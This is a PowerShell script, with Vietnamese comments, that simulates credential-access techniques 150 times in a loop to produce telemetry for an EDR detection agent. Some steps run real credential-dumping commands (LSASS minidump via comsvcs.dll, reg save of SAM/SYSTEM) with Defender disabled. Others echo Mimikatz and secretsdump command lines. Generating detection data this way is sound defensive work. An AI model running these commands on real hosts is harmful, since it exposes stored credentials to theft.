# D:\Universe\VCS\EDR_AI_Agent\simulate3.ps1
# Script gia lap thu thap Telemetry NHAN 2: Credential Access
#
# YEU CAU:
#   - Chay voi quyen Administrator
#   - Da tat Windows Defender (Real-time + Tamper Protection)
#
# Chay bang:
#   powershell.exe -ExecutionPolicy Bypass -File .\simulate3.ps1
#
# Cac kich ban bao quat dac trung Credential Access:
#   Kich ban 1: LSASS Memory Dump via comsvcs.dll  -> lsass_access, access_rights_vm_read, is_lolbin, is_in_temp_path
#   Kich ban 2: SAM/SYSTEM Registry Backup          -> reg_sam_security_access, is_in_temp_path, token_elevated
#   Kich ban 3: Mimikatz cmdline simulation          -> cmdline_suspicious_kw_count (mimikatz, sekurlsa)
#   Kich ban 4: Procdump/Minidump cmdline simulation -> cmdline_suspicious_kw_count (procdump, minidump, lsass)
#   Kich ban 5: Credential file harvesting          -> process_rarity_score, is_in_temp_path, parent_is_script_engine
#   Kich ban 6: NTDS + DCSync simulation             -> cmdline_suspicious_kw_count (ntds, secretsdump, drsuapi)

$logFile = "C:\windows\temp\simulate1_debug.log"
"--- BAT DAU GIA LAP CREDENTIAL ACCESS ---" | Out-File $logFile

function Log-Step($msg) {
    $time = Get-Date -Format "HH:mm:ss"
    $formatted = "[$time] $msg"
    Write-Host $formatted -ForegroundColor Cyan
    $formatted | Out-File $logFile -Append
}

# Lay PID cua tien trinh LSASS (can cho kich ban 1)
$lsassPid = $null
try {
    $lsassPid = (Get-Process -Name "lsass" -ErrorAction Stop).Id
    Log-Step "Da lay duoc LSASS PID: $lsassPid"
} catch {
    Log-Step "[CANH BAO] Khong the lay PID cua LSASS. Kich ban 1 se bi bo qua."
}

try {
    for ($i = 1; $i -le 150; $i++) {
        Log-Step "=== Vong lap $i/150 ==="

        # =========================================================
        # KICH BAN 1: LSASS Memory Dump via comsvcs.dll (T1003.001)
        # Kich hoat: lsass_access, access_rights_vm_read, is_lolbin (rundll32),
        #            is_in_temp_path, cmdline_suspicious_kw_count (lsass, comsvcs, rundll32)
        # =========================================================
        Log-Step "Chay kich ban 1: LSASS Dump via comsvcs..."
        if ($lsassPid) {
            $dumpFile = "C:\windows\temp\mem_$i.dmp"
            rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $lsassPid $dumpFile full > $null 2>&1
            Start-Sleep -Milliseconds 500
            if (Test-Path $dumpFile) { Remove-Item $dumpFile -Force > $null 2>&1 }
        } else {
            # Fallback: gia lap qua cmdline neu khong co quyen
            cmd.exe /c "echo rundll32.exe comsvcs.dll MiniDump lsass.exe C:\windows\temp\mem_$i.dmp full" > $null 2>&1
        }
        Log-Step "Hoan thanh kich ban 1."

        # =========================================================
        # KICH BAN 2: SAM / SYSTEM Registry Backup (T1003.002)
        # Kich hoat: reg_sam_security_access, is_in_temp_path,
        #            token_elevated, cmdline_suspicious_kw_count
        # =========================================================
        Log-Step "Chay kich ban 2: SAM Registry Backup..."
        $samFile    = "C:\windows\temp\sam_$i.hiv"
        $systemFile = "C:\windows\temp\sys_$i.hiv"
        reg save HKLM\SAM    $samFile    /y > $null 2>&1
        reg save HKLM\SYSTEM $systemFile /y > $null 2>&1
        if (Test-Path $samFile)    { Remove-Item $samFile    -Force > $null 2>&1 }
        if (Test-Path $systemFile) { Remove-Item $systemFile -Force > $null 2>&1 }
        Log-Step "Hoan thanh kich ban 2."

        # =========================================================
        # KICH BAN 3: Mimikatz Cmdline Simulation (T1003.001)
        # Kich hoat: cmdline_suspicious_kw_count (mimikatz, sekurlsa),
        #            process_rarity_score, parent_is_script_engine
        # Ghi chu: Dung echo de tranh Defender, EDR van doc duoc CommandLine
        # =========================================================
        Log-Step "Chay kich ban 3: Mimikatz cmdline simulation..."
        cmd.exe /c "echo mimikatz sekurlsa::logonpasswords lsass minidump exit" > $null 2>&1
        Log-Step "Hoan thanh kich ban 3."

        # =========================================================
        # KICH BAN 4: Procdump / Minidump Cmdline Simulation (T1003.001)
        # Kich hoat: cmdline_suspicious_kw_count (procdump, minidump, lsass),
        #            is_in_temp_path, parent_is_script_engine
        # =========================================================
        Log-Step "Chay kich ban 4: Procdump/Minidump simulation..."
        cmd.exe /c "echo procdump.exe -ma lsass.exe C:\windows\temp\lsass_$i.dmp -minidump" > $null 2>&1
        Log-Step "Hoan thanh kich ban 4."

        # =========================================================
        # KICH BAN 5: Credential File Harvesting (T1552.001)
        # Kich hoat: process_rarity_score (ten file la), is_in_temp_path,
        #            parent_is_script_engine, lifetime_ms_log (tien trinh ton tai ngan)
        # =========================================================
        Log-Step "Chay kich ban 5: Credential file harvesting..."
        $credHarvesterExe = "C:\windows\temp\cred_harvest_$i.exe"
        copy C:\windows\system32\whoami.exe $credHarvesterExe > $null 2>&1
        & $credHarvesterExe /upn > $null 2>&1
        Start-Sleep -Milliseconds 50
        if (Test-Path $credHarvesterExe) { Remove-Item $credHarvesterExe -Force > $null 2>&1 }
        Log-Step "Hoan thanh kich ban 5."

        # =========================================================
        # KICH BAN 6: NTDS + DCSync Simulation (T1003.003)
        # Kich hoat: cmdline_suspicious_kw_count (ntds, secretsdump, drsuapi),
        #            is_in_system_path, parent_is_script_engine
        # =========================================================
        Log-Step "Chay kich ban 6: NTDS/DCSync simulation..."
        cmd.exe /c "echo secretsdump ntds.dit drsuapi samr lsass sekurlsa::krbtgt" > $null 2>&1
        Log-Step "Hoan thanh kich ban 6."

        # Nghi ngau nhien tu 300ms den 700ms de phan bo event tu nhien
        $randomDelay = Get-Random -Minimum 300 -Maximum 700
        Start-Sleep -Milliseconds $randomDelay
    }
} catch {
    Log-Step "LOI PHAT SINH: $_"
}

Log-Step "--- HOAN THANH GIA LAP CREDENTIAL ACCESS ---"
